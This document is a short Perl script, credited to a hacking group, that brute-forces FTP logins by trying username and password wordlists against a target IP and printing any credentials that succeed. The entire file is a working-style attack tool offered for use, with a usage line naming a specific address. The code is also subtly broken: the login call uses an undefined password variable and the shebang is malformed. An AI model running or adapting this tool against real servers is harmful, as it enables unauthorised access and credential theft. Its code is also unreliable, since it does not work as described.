#usr/bin/perl

use Net::FTP;
use Term::ANSIColor;
use if $^O eq "MSWin32", Win32::Console::ANSI;

@months = qw( January February March April May June July August September October November December );
@days = qw(Sunday Monday Tuesday Wednesday Thursday Friday Saturday Sunday);
($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();

if ($^O =~ /MSWin32/) {system("mode con: cols=100 lines=29");system("cls"); }else { system("resize -s 28 87");system("clear"); }

print color 'bold green';
print<<prakasap05;
----------------------------------------------------\nAuthor: prakasap05 || Community: Buitenzorg Syndicate\n   Date and Time: $sec:$min:$hour - $days[$wday],$mday-$months[$mon]-$year\n-----------------------------------------------------\n\n
prakasap05

$host=$ARGV[0]|| die "[-] Notes: Create files named akas-users.txt and akas-pass.txt and fill in the wordlist, then run according to the example below.\n[-] Example: perl akas-ftp.pl 45.64.1.52 || ./akas-ftp.pl 45.64.1.52\n\n\n";

open(MrTamfanX,"< ./akas-users.txt") or die "akas-users.txt not found";
chomp(my @akasuser = <MrTamfanX>);

open(prakasap,"< ./akas-pass.txt") or die "akas-pass.txt not found";
chomp(my @akaspasss = <prakasap>);


foreach(sort @akasuser){   
foreach my $akaspass (sort @akaspasss){

my $akas = Net::FTP->new("$host",
		Debug => 1,
		Passive=>0) or die "The FTP server failed to establish a connection.";

if ($akas->login($_,$pass)){
print "\t\n";
print color 'bold yellow';
print "[•]Congratulations, your Brute Force has succeeded. Say thanks to prakasap05\n\n";
print color 'reset';
print color 'bold red';
print "[!]FTP-server: $host\n";
print "[!]FTP-user: $_\n";
print "[!]FTP-pass: $akaspass\n";
print color 'reset';
print "\n\n";
}
}
}
